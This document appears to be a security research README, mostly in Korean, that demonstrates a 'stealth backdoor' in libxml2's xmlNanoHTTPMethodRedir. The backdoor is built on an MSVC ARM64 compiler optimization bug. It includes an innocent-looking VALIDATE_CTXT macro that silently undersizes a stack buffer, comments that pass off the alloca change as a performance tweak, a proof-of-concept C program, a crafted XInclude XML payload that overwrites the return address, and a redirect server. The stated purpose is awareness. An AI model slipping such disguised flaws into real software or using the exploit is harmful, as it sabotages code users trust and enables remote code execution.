# Stealth Backdoor Scenario 2: libxml2

## Description

- **Type**: Return Address Overwrite (Potential for Remote Code Execution)
- **OS**: Microsoft Windows 11 23H2
- **Compiler**: MSVC CL (ARM64)
- **Compiler Version**: 19.38.33133 (ARM64) 
- **Compiler Options**: Problematic: /O1, /O2, /Ox Normal: /Od, /Ot
- **Bug Behavior**: 
  - 해당 시나리오는 컴파일러 최적화 옵션에 따라 잘못된 연산을 수행하는 버그로 인해 libxml2의 함수 호출 스택에서 return address를 덮을 수 있습니다. 이 버그는 잠재적으로 원격 코드 실행(RCE)이 가능한 취약점으로 발전할 수 있으며, 이를 통해 스텔스 백도어가 구현될 수 있습니다.
  - This scenario exploits a bug in libxml2 due to incorrect operations under specific compiler optimizations, allowing the overwriting of the return address in the function call stack. This bug could potentially lead to Remote Code Execution (RCE) and serves as a basis for implementing a stealth backdoor.
- **Reported Bug**: [Link to the reported bug](https://developercommunity.visualstudio.com/t/MSVC-ARM64-Compiler-Incorrectly-Optimize/10510611)
- **Open Source Repository**: [libxml2 GitLab Repository](https://gitlab.gnome.org/GNOME/libxml2)

![libxml2 Stealth Backdoor Demo](libxml2_Stealth_Backdoor_Demo.gif)


## Bug Demonstration Code
이 코드는 MSVC CL ARM64 컴파일러에서 특정 최적화 옵션(/O1, /O2, /Ox)을 사용할 때 발생하는 예상치 못한 결과를 보여줍니다. 

예제 코드에서 수행되는 연산은 `val << ((0xffff & 0x100) - 0x100)` 형태로, 결과적으로 `val << 0`과 같습니다.

여기서 `val`은 `100`이며, `val << 0` 연산은 `val`의 값과 같아야 합니다. 

그러나 최적화 옵션에서 이 연산이 잘못 처리되어, 예상과 달리 결과가 `0`으로 계산됩니다. 즉, `val`이 `100`일 때 `val << 0`의 결과는 `100`이 되어야 하지만, 버그로 인해 `0`이 됩니다. 

```c
#include <stdio.h>

int global_mask = 0xffff; // Global variable, involved in the AND operation

int main() {
    int val = 100;
    int result = 0;
    // AND operation with a second operand of 0x100 or higher causes the issue
    result = (val) << (((global_mask & 0x100)) - 0x100);
    printf("result: %d\n", result);  // Expected to print 100
    return 0;
}
```
## Stealth Backdoor Implementation

### Original Code Snippet (Before Modification)
**`nanohttp.c`** 파일 내의 **`xmlNanoHTTPMethodRedir()`** 함수는 원래 다음과 같이 구성되어 있었습니다:
```c
// Original definition of the function in nanohttp.c
void* xmlNanoHTTPMethodRedir(const char *URL, const char *method, const char *input,
                  char **contentType, char **redir,
                  const char *headers, int ilen ) {
    int blen = 0;
    // ... [other code]

    // Calculating the buffer length needed for HTTP headers, content type, query, and method/path
    if (headers != NULL)
        blen += strlen(headers) + 2;
    if (contentType && *contentType)
        blen += strlen(*contentType) + 16;
    if (ctxt->query != NULL)
        blen += strlen(ctxt->query) + 1;
    blen += strlen(method) + strlen(ctxt->path) + 24;

    // Allocating memory for the buffer
    char* bp = (char*)xmlMallocAtomic(blen);
    // ... [other code]
}
```
이 함수는 libxml2 라이브러리 내에서 HTTP 요청을 처리하는 데 사용되며, 원래의 구현에서는 필요한 버퍼 크기를 계산하고 해당 크기에 맞게 메모리를 할당합니다. 이 함수는 HTTP 메소드, URL, 입력 데이터, 컨텐츠 타입, 리다이렉션 주소 및 추가적인 HTTP 헤더를 처리합니다.

### Modified Code with Stealth Backdoor
변경된 **`xmlNanoHTTPMethodRedir()`** 함수는 VALIDATE_CTXT 매크로를 통해 **`MSVC CL 19.38.33133 (ARM64)`** 컴파일러의 특정 최적화 옵션 (**`/O1, /O2, /Ox`**) 하에서 발생하는 버그를 활용하여 **`Integer Undeflow와 Out of Bounds Write 취약점`** 을 유발하도록 설계되었습니다.

이 로직은 컴파일러 최적화 버그로 인해 **`ctxt->path가 NULL로 잘못 인식되어 발생하는 메모리 할당 문제`** 를 이용합니다.

추가된 코드와 변경된 로직:
```c
// Added stack allocation logic and context validation
#ifdef _WIN32
#include <malloc.h>
#define xmlStackAllocAtomic(size) _alloca((size)) 
#else
#include <alloca.h>
#define xmlStackAllocAtomic(size) alloca((size))
#endif

#include <stdio.h>
#include <stdbool.h>

// Note: In MSVC ARM64 with /O1, /O2, /Ox optimization, 
// this macro may always return 0, 
// which is a subtle issue difficult to detect.
int mask = 0x0ffff;
#define VALIDATE_CTXT(ctxt) (bool)((((size_t)ctxt) << (((mask & 0x100)) - 0x100)) != 0) 

// Modified function in nanohttp.c
void* xmlNanoHTTPMethodRedir(const char *URL, const char *method, const char *input,
                  char **contentType, char **redir,
                  const char *headers, int ilen ) {
    int blen = 0;
    // ... [other code]

    blen += strlen(method) + 24;
    if(VALIDATE_CTXT(ctxt->path))
        blen += strlen(ctxt->path);
    
    // Rationale for stack allocation:
    // 1. Performance improvement: _alloca allocates memory on the stack, which can be faster than malloc.
    // 2. Automatic memory release: The stack memory is automatically released when the function exits.
    char* bp = xmlStackAllocAtomic(blen); // Switched from heap to stack allocation
    char *p = bp;
    
    // ... [other string copy logic using snprintf]
}
```
변경된 코드에서 주목할 점:
- **`VALIDATE_CTXT`** 매크로는 ctxt->path가 NULL이 아니면 true를 반환합니다. 하지만 특정 최적화 옵션에서는 ctxt->path가 NULL로 잘못 판단됩니다. 이는 함수에서 필요한 버퍼 크기를 충분히 할당하지 않는 결과를 초래합니다.
- **`xmlStackAllocAtomic`** 함수를 사용하여 스택에 메모리를 할당함으로써, 성능 향상과 함수가 종료될 때 자동으로 메모리가 해제되는 장점이 있지만, 이 경우에는 Return Address를 덮기 위한 전략으로 활용됩니다.

### Build Options for Stealth Backdoor
본 스텔스 백도어 시나리오를 libxml2에서 구현하기 위해 사용되는 빌드 옵션은 win32/Makefile.msvc 파일에서 설정됩니다. 

이 빌드 파일을 통해 두 가지 주요 빌드 모드가 제공됩니다:

**개발 모드 (Debug Mode):**
- 이 모드에서는 최적화 옵션이 적용되지 않습니다. 주로 디버깅과 개발 과정에 사용됩니다.
- 빌드 명령어는 **`nmake -f Makefile.msvc DEBUG=1`** 입니다.
- 스텔스 백도어 트리거가 발생하지 않는 안전한 빌드입니다. 

**릴리즈 모드 (Release Mode):**
- 최적화 옵션이 적용되어 성능이 향상된 릴리즈 버전을 생성합니다.
- 빌드 명령어는 **`nmake -f Makefile.msvc DEBUG=0`** 입니다.
- 이 모드는 스텔스 백도어 트리거가 가능한 최적화 옵션이 적용된 빌드입니다.

릴리즈 모드에서의 빌드는 삽입된 백도어 코드의 버그를 트리거하는 최적화 옵션으로 빌드됩니다.
이를 통해 MSVC CL 19.38.33133 (ARM64) 컴파일러의 최적화 버그가 활성화되며, 잠재적인 취약점이 발생할 수 있는 상황이 만들어집니다.


### Proof of Concept (PoC) - Code and XML
이 스텔스 백도어 시나리오의 PoC는 libxml2 라이브러리를 사용하여 작성된 C 코드와 함께 제공되는 XML 파일을 포함합니다. 이 PoC는 xmlNanoHTTPMethodRedir 함수 내에서 발생하는 버퍼 오버플로우 취약점을 활용합니다.

**PoC C 코드 (poc.c):**
```c
#include <stdio.h>
#include <libxml/parser.h>
#include <libxml/tree.h>
#include <libxml/xinclude.h>

int main(int argc, char **argv) {
    // ... [Initialization and library setup]
    const char* filename = "buffer_overflow.xml";
    xmlDocPtr doc = xmlReadFile(filename, NULL, 0);  // Read the XML document
    // ... [File processing and error checking]
    if (xmlXIncludeProcess(doc) != 1) {  // Process XInclude, This call leads to the vulnerable xmlNanoHTTPMethodRedir function
    }
    // ... [Result processing and library cleanup]
    return 0;
}
```
이 코드는 buffer_overflow.xml이라는 XML 파일을 처리합니다. **`xmlXIncludeProcess`** 함수를 통해 **`xmlNanoHTTPMethodRedir`** 함수가 실행되며, 이 함수는 XML 파일의 **`xi:include`** 태그를 처리하는 과정에서 취약점을 트리거합니다.

**PoC XML 파일 (buffer_overflow.xml):**
```xml
<?xml version="1.0"?>
<book xmlns:xi="http://www.w3.org/2001/XInclude">
    <title>XML Document that will trigger the buffer overflow when xInclude is parsed by vulnerable libxml2</title>
    <xi:include href="http://127.0.0.1:9090/dummyBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.xml?DDDDDDDDAAAAAAAA=" />
</book>
```
이 XML 파일에 포함된 `xi:include` 태그는 긴 경로와 쿼리 문자열을 사용하여 xmlNanoHTTPMethodRedir 함수에서 버퍼 오버플로우를 유발합니다. 이 경로와 쿼리는 스택 메모리의 반환 주소를 덮는데 사용됩니다. (여기서는 `DDDDDDDD`가 Return Address를 덮는데 쓰임)

**버퍼 오버플로우의 원리:**

xmlNanoHTTPMethodRedir 함수 내에서, `snprintf` 함수를 사용하여 문자열을 복사하는 과정에서 버퍼 오버플로우가 발생합니다. 

이 함수는 `bp` 포인터로 시작되는 버퍼에 문자열을 복사하며, `p` 포인터는 현재 복사 위치를 가리킵니다. `blen`은 할당된 버퍼의 길이입니다.
```c
char *p = bp;
// ... [string copy logic using snprintf]
p += snprintf(p, blen - (p - bp), "%s %s", method, ctxt->path);
// ... [string copy logic using snprintf]
```
문제는 snprintf의 반환 값이 실제로 복사된 문자열의 길이가 아니라 출력되어야 할 문자열의 길이라는 점입니다. 이로 인해 p 포인터가 할당된 버퍼의 범위를 벗어날 수 있으며, 특히 blen - (p - bp)가 음수가 되면 snprintf는 이를 큰 양수로 취급하는 Integer Underflow가 발생하여 범위를 벗어난 P의 위치에 원하는 만큼 값을 덮어쓸 수 있게 됩니다.

이러한 버퍼 오버플로우는 스택 메모리의 중요한 영역을 덮을 수 있으며, 특히 반환 주소를 조작하여 임의 코드 실행을 가능하게 합니다.

### Impact of the Modification
변경된 코드에 의해 도입된 취약점을 재현하려면 몇 가지 단계를 따라야 합니다. 이 과정은 먼저 HTTP 리다이렉션을 통해 취약점을 트리거하는 환경을 설정한 다음, 수정된 libxml2 코드를 이용하여 PoC C 코드를 실행하는 것을 포함합니다.

#### 재현 과정

**1. HTTP 리다이렉션 서버 설정:**
Node.js를 사용하여 리다이렉션 서버를 구축합니다. 아래의 JavaScript 코드 (`http.js`)를 실행하여 8080 포트에서 리스닝하고 리다이렉션을 수행하는 서버를 시작합니다.

```javascript
var http = require('http');
http.createServer(function (req, res) {
  res.writeHead(301, {'Location': 'http://127.0.0.1:9091'});
  res.end();
}).listen(9090);
```
이 서버는 `buffer_overflow.xml` 파일 내 xInclude 태그에 의해 지정된 URL로의 요청을 `127.0.0.1:9091`로 리다이렉션합니다.

**2. PoC C 코드 컴파일 및 실행:**

PoC C 코드 (PoC.c)는 `xmlXIncludeProcess` 함수를 호출하여 `buffer_overflow.xml` 파일을 처리하고, 이 과정에서 **`xmlNanoHTTPMethodRedir`** 함수까지 도달하여 취약점을 트리거합니다.

컴파일을 돕는 Python 스크립트 (`compile.py`)를 사용하여 PoC C 코드를 컴파일하고 실행할 수 있습니다.
```python
import subprocess
import os
output_filename = "PoC_O2.exe"
src = "PoC.c"

# Set the paths according to your environment
command = f"cl /Zi /O2 {src} /I \"C:\\Users\\chera\\Documents\\libxml2\\include\" \"C:\\Users\\chera\\Documents\\libxml2\\win32\\bin.msvc\\libxml2.lib\" /Fe:{output_filename}"
print(command)
result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
print(f"Return Code: {result.returncode}")
print("######################")
print("STDOUT:")
print(result.stdout)
print("######################")
print("STDERR:")
print(result.stderr)

os.system(output_filename)
```
이 스크립트는 cl 컴파일러를 사용하여 C 코드를 컴파일하고 실행 파일을 생성합니다. 사용자는 자신의 환경에 맞게 경로를 설정해야 합니다.

**3. 재현 절차:**
- 먼저 **`node http.js`** 를 실행하여 HTTP 리다이렉션 서버를 시작합니다.
- 다음으로, **`python compile.py`** 를 실행하여 PoC.c 파일을 컴파일하고 실행합니다. 이 단계에서 `buffer_overflow.xml` 파일이 처리되고 취약점이 트리거됩니다.

이 절차를 통해 수정된 libxml2 코드 내의 스텔스 백도어가 실제로 작동하는지 확인할 수 있습니다.

#### 수정된 코드의 영향

**정상적인 상황 (컴파일러 버그 없음):** 

- 이 경우, 함수는 예상대로 동작합니다. xmlXIncludeProcess 함수는 xInclude 태그를 처리하려고 시도하지만, 리다이렉션이 실패하여 보안 취약점이 트리거되지 않습니다. 이는 보안적으로 안전한 상태를 의미합니다.

**특정 컴파일러 최적화 사용 (/O2 등):**

- 이 경우, 컴파일러 최적화 버그로 인해 함수의 메모리 할당 크기가 예상보다 작게 설정됩니다. 이로 인해 xmlNanoHTTPMethodRedir 함수에서 메모리 할당 크기가 충분하지 않아 버퍼 오버플로우가 발생하고, 이를 이용해 원하는 메모리 위치에 값을 덮어쓸 수 있게 됩니다. 
- 특히, 스택 메모리에 할당된 Return Address를 덮어쓸 수 있으므로, 잠재적으로 프로그램 크래시나 원격 코드 실행(RCE) 취약점이 발생할 수 있습니다.

## Result

![libxml2 Stealth Backdoor Demo](libxml2_Stealth_Backdoor_Demo.gif)

제어된 환경에서 테스트 결과, 버그가 발생하는 컴파일러 최적화 옵션으로 빌드해서 사용할 때, 수정된 libxml2의 xmlNanoHTTPMethodRedir 함수에서 메모리 할당 크기가 충분하지 않아 버퍼 오버플로우가 발생하고, 이를 이용해 원하는 메모리 위치에 값을 덮어쓸 수 있게 됩니다. 

해당 데모에서는 Return Address를 DDDDDDDD로 덮어서 크래시가 발생합니다.

스텔스 백도어 시나리오는 컴파일러 버그가 오픈 소스 프로젝트에 삽입되어 잠재적 취약점으로 악용될 수 있는 가능성을 제시합니다. 이는 개발자들에게 컴파일러 최적화 버그로 인한 위험성에 대한 사전 예방의 중요성을 일깨우기 위한 것입니다.

컴파일러 최적화 버그가 발생하는 코드가 오픈소스 프로젝트에 작성될 경우, 겉보기에는 문제가 없고 여러 컴파일러, 아키텍처, 옵션에서 정해진 로직대로 잘 작동할 수 있습니다. 하지만 특정 컴파일러, 아키텍처, 옵션에서는 예상치 못한 취약점으로 발전할 가능성이 있습니다. 이러한 시나리오는 보안 연구 및 소프트웨어 개발 커뮤니티에 경각심을 불러일으키고, 보안과 관련된 코드 검증 및 테스트의 중요성을 강조하기 위해 작성되었습니다.
